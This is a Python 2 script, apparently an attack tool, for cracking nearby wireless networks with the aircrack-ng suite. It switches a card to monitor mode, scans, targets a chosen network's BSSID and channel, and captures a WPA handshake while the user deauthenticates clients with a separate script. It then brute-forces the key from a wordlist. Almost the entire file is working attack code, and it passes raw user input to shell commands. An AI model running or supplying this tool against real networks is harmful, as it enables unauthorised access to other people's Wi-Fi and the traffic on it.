#! /usr/bin/python
# -*- coding: utf-8 -*-

"""
A small script to help you crack nearby wireless networks.
this script uses aircrack-ng suite

Author: yelhamer (github.com/yelhamer)
"""

from os import system
from time import sleep
from termcolor import colored

logo = """
 █     █░██▓ ███████▓▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▓█████ ██▀███  
▓█░ █ ░█▓██▓██   ▓██▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█▒██▒████ ▒██▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░▒███  ▓██ ░▄█ ▒
░█░ █ ░█░██░▓█▒  ░██▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄▒▓█  ▄▒██▀▀█▄  
░░██▒██▓░██░▒█░  ░██▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████░██▓ ▒██▒
░ ▓░▒ ▒ ░▓  ▒ ░  ░▓ ░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░  ▒ ░░     ▒ ░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░
  ░   ░  ▒ ░░ ░   ▒ ░         ░░   ░  ░   ▒  ░       ░ ░░ ░   ░    ░░   ░ 
    ░    ░        ░ ░ ░        ░          ░  ░ ░     ░  ░     ░  ░  ░     
                    ░                        ░                            
"""

intro = """Simple Access-Point Auditing script"""

print colored(logo, 'green')
print colored(intro, 'green')

# asks for wireless card to apply monitor mode on it
wireless_card = raw_input("Wireless Interface to use: ")

# turns wireless card into monitor mod
mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
system(mon0)

# runs a scan with airodump-ng to get available wifi
airodump = 'airodump-ng {0}'.format(wireless_card)
system(airodump)

# asks for your target's bssid
bssid = raw_input("Target's BSSID: ")

# asks for your target's channel
channel = raw_input("Target's Operating Channel: ")
save = raw_input("Save Directory ")
print colored("...", "red"),
print colored("Airodump will start, in the meanwhile, run deauth.py in a new terminal", "red")
sleep(5)

# starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
system(airodump2)
print colored("Handshake is captured", "green")
print colored("Cracking the handshake with aircrack-ng is starting...", "green")

# 'Aircrack-ng' parameters set
wordlist = raw_input("Wordlist Path: ")
save2 = raw_input("Directory of the Previously Generated Cap File e.g. 01.cap")
print colored("This might take a while", "red")
crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
system(crack)
print("Quitting")
